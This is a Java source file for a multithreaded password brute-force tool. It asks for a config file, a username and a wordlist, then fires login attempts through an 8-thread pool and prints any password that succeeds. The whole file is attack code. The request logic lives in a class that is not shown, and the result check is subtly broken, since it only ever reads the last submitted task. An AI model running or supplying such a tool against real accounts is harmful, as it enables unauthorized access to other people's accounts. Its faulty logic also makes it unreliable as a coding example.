import java.io.DataInputStream;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Scanner;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Main {
    private static ExecutorService pool;
    private static RequestTask reqTask;
    private static String configFilePath;
    private static String username;
    private static ArrayList<String> passwords;
    private static Scanner scanner;

    public static void main(String[] args) throws IOException {
        pool = Executors.newFixedThreadPool(8);
        scanner = new Scanner(System.in);
	    System.out.println("Enter absolute path of config file:");
        configFilePath = scanner.nextLine();
        System.out.println("Enter username");
        username = scanner.nextLine();
        System.out.println("Enter absolute path of passwords file:");
        loadPasswordFile(scanner.nextLine());
        System.out.println("Press enter to start brute force.");
        scanner.nextLine();
        bruteForce();
    }

    private static void loadPasswordFile(String path) {
        try (DataInputStream dis = new DataInputStream(new FileInputStream(path))) {
            passwords = new ArrayList<>();
            while(dis.available() > 0) {
                passwords.add(dis.readLine());
            }
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void bruteForce() throws IOException {
        for(String s : passwords) {
            reqTask = new RequestTask(configFilePath) {
                @Override
                protected RequestResult call() throws Exception {
                    makeRequest(username, s);
                    return result;
                }
            };
            pool.submit(reqTask);
        }
        pool.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    RequestResult result = reqTask.get();
                    System.out.println(result.password + "     :     " + result.correct);
                    if(result.correct) {
                        System.out.println("Password found:  " + result.password);
                        scanner.nextLine();
                        System.exit(0);
                    }
                } catch (InterruptedException e) {
                    e.printStackTrace();
                } catch (ExecutionException e) {
                    e.printStackTrace();
                }
            }
        });
    }
}
